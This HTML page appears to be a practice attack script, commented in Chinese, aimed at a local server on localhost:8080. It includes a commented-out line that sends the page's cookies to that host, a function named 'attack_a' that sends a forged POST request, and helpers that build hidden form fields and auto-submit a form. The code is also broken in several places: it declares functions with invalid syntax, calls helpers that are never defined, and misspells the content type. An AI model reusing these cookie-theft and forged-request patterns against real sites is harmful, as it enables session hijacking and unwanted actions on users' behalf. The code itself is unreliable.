
<html>
<head>


</head>
<body>

<script type="text/javascript" charset="utf-8">
	//new Image().src="http://localhost:8080/"+escape(document.cookie);
	var xhr = function(){
		var request = false;
		if(window.XMLHttpRequest){
			request=new XMLHttpRequest();
		}else if(window.ActiveXObject){
			try{
				request=new window.ActiveXObject('Microsoft.XMLHTTP');
			}catch(e){}
		}
		return request;
	}();

	var request = function(method,src,argv,content_type){
		xhr.open(method,src,false);//同步方式
		if(method=='POST'){
			xhr.setRequestHeader('Content-Type',content_type);
		}
		xhr.send(argv);
		return xhr.responseText;
	};

	var attack_a = function(){
		var src = "http://localhost:8080";
		var argv_0= "&arg1=aaa&arg2=11112";
		request("POST",src,argv_0,"application/x-www-form-urencoded");
	};
//	attack_a();

	//document.body.appendChild(attack_new_element("input","type","text","name","aaa","value","ccc"));

	
	
	//创建指定标签，第一个参数为标签字符串，后面的两两一组，为属性与属性值
	function $.create.element(elementTag){
		var element = document.createElement(elementTag);
		for(var i=1;i<arguments.length;){
			element[arguments[i]]=arguments[i+1];
			i=i+2;
		}
		return element;
	}
	//创建隐藏的”name“＝key，“value”＝value的标签
	function $.create.input(key,value){
		return $.create.element("input","type","hidden","name",key,"value",value);
	}
	function $.create.form(action,method){
		return $.create.element("form","action",action,"method",method);
	}
	function $.create.form.post(action){
		return $.create.form(action,"post");
	}
	function $.post(url){
		var form = $.create.form.post();
		for(var i=1;i<arguments.length;){
			form.appendChild(attack_new_input(arguments[i],arguments[i+1]));
			i=i+2;			
		}
		form.submit();
	}
	$.post("http://localhost:8080/","zhangsan","lisi");

	
	
</script>

</body>
</html>